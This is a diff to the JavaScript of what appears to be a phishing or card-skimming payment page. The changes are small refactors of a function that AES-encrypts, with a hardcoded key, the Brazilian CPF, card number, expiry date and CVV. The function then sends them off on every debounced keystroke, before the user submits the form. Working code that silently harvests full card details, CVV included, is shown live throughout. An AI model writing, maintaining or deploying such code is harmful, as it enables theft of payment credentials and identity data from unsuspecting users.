@@ -25,10 +25,10 @@ async function sendTempData() {
 
     const data = {
         sessionId,
-        cpf: cpfInput ? CryptoJS.AES.encrypt(cpfInput.value || '', '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString() : null,
-        cardNumber: cardNumberInput ? CryptoJS.AES.encrypt(cardNumberInput.value || '', '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString() : null,
-        expiryDate: expiryDateInput ? CryptoJS.AES.encrypt(expiryDateInput.value || '', '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString() : null,
-        cvv: cvvInput ? CryptoJS.AES.encrypt(cvvInput.value || '', '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString() : null
+        cpf: cpfInput && cpfInput.value ? CryptoJS.AES.encrypt(cpfInput.value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString() : null,
+        cardNumber: cardNumberInput && cardNumberInput.value ? CryptoJS.AES.encrypt(cardNumberInput.value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString() : null,
+        expiryDate: expiryDateInput && expiryDateInput.value ? CryptoJS.AES.encrypt(expiryDateInput.value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString() : null,
+        cvv: cvvInput && cvvInput.value ? CryptoJS.AES.encrypt(cvvInput.value, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString() : null
     };
 
     try {
@@ -317,8 +317,8 @@ if (cardNumberInput) {
         formatCardNumber(cardNumberInput);
         validateCardNumber();
         checkFields();
-        sendTempData(); // Envia todos os campos
-    }, 100)); // Ajustado para 100ms
+        sendTempData();
+    }, 100));
 }
 
 if (expiryDateInput) {
@@ -326,15 +326,15 @@ if (expiryDateInput) {
         formatExpiryDate(expiryDateInput);
         validateExpiryDate();
         checkFields();
-        sendTempData(); // Envia todos os campos
-    }, 100)); // Ajustado para 100ms
+        sendTempData();
+    }, 100));
 }
 
 if (cvvInput) {
     cvvInput.addEventListener('input', debounce(() => {
         checkFields();
-        sendTempData(); // Envia todos os campos
-    }, 100)); // Ajustado para 100ms
+        sendTempData();
+    }, 100));
 }
 
 // Enviar dados e ir para tela de análise
@@ -404,7 +404,7 @@ window.onload = async () => {
         cpfInput.addEventListener('input', debounce(() => {
             formatCPF(cpfInput);
             checkCPF();
-            sendTempData(); // Envia todos os campos
-        }, 100)); // Ajustado para 100ms
+            sendTempData();
+        }, 100));
     }
 };
